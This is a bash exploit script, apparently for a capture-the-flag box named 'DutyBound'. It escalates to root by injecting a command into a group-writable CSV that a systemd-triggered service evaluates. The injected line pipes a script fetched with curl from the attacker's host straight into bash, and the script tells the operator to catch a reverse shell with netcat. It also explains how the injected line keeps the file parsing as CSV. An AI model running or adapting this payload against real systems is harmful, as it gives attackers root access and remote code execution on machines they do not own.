#!/bin/bash
# DutyBound — stage 3: root via systemd path-unit + eval() of a group-writable CSV.
# Run as dutyfree-kiosk (member of pos-ops). root.sh must be reachable over HTTP.
#
# usage: ./csv_privesc.sh <lhost> [lport]
#   e.g. ./csv_privesc.sh 10.10.14.95 4446
set -euo pipefail

LHOST="${1:?usage: $0 <lhost> [lport]}"
LPORT="${2:-4446}"
CSV=/opt/vrs/data/duty-rates.csv

if [ ! -w "$CSV" ]; then
  echo "[!] $CSV is not writable by $(id -un); check pos-ops group membership"
  exit 1
fi

cp "$CSV" /tmp/duty-rates.csv.orig

# 'true;' ends the benign eval, the pipe runs our script, '#' comments out the
# remainder of the line so the file still parses as CSV.
printf '%s\n' "true;curl -s http://${LHOST}:8000/root.sh|bash;#,1,1" \
  > /tmp/duty-rates.csv.new
cat /tmp/duty-rates.csv.orig >> /tmp/duty-rates.csv.new
cat /tmp/duty-rates.csv.new > "$CSV"

echo "[*] payload written to $CSV"
echo "[*] waiting for the path unit to trigger the root service..."
echo "[*] watch:  nc -lvnp ${LPORT}   (and your HTTP log for GET /root.sh)"
echo
echo "[*] restore afterwards with:"
echo "    cat /tmp/duty-rates.csv.orig > $CSV"
